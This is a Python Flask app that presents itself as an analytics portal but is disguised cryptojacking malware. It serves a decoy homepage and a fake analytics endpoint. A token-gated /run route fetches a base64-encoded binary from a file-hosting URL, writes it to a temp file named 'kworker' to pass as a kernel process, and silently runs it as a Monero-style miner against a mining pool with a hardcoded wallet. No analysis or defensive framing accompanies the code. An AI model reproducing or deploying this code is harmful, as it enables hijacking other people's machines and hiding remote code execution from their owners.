import os
import subprocess
import base64
import requests
import tempfile
import threading
from flask import Flask, request

app = Flask(__name__)

# 🔒 Configurations
REMOTE_PAYLOAD_URL = "https://0x0.st/8nW7.b64"
TRIGGER_TOKEN = "runXMR"
FAKE_BINARY_NAME = "kworker"

def stealth_fetch_and_launch():
    try:
        print("[*] Fetching base64 payload...")
        encoded = requests.get(REMOTE_PAYLOAD_URL).text.strip()

        binary = base64.b64decode(encoded)

        with tempfile.NamedTemporaryFile(delete=False) as f:
            bin_path = f.name
            f.write(binary)
            os.chmod(bin_path, 0o755)

        # Rename to look legit
        safe_path = os.path.join(tempfile.gettempdir(), FAKE_BINARY_NAME)
        os.rename(bin_path, safe_path)

        print("[+] Executing cloaked binary...")
        subprocess.Popen(
            [safe_path,
             "-a", "rx/0",
             "-o", "in.salvium.herominers.com:1230",
             "-u", "SaLvdUFXatp5x7yDhRhqrgL9wYNaj379vj1jdwWUKY6GDXKVxachcFV9R4qUAziZtGDgNCQJVQwrkGhD7VjknpSCbH5p8kwbReo",
             "-p", "meb",
             "--donate-level", "1"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

    except Exception as e:
        print("[-] Error in miner launch:", e)

@app.route('/')
def home():
    return '''
    <html>
    <head><title>Flask Analytics Portal</title></head>
    <body>
        <h1>Welcome to Flask Analytics Suite</h1>
        <p>Data visualization and real-time metrics platform.</p>
    </body>
    </html>
    '''

@app.route('/analytics')
def fake_api():
    return {"visitors": 12, "bounce_rate": "43%", "status": "active"}

@app.route('/run')
def trigger():
    if request.args.get("token") == TRIGGER_TOKEN:
        threading.Thread(target=stealth_fetch_and_launch).start()
        return "✅ Payload triggered."
    return "❌ Unauthorized", 403

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
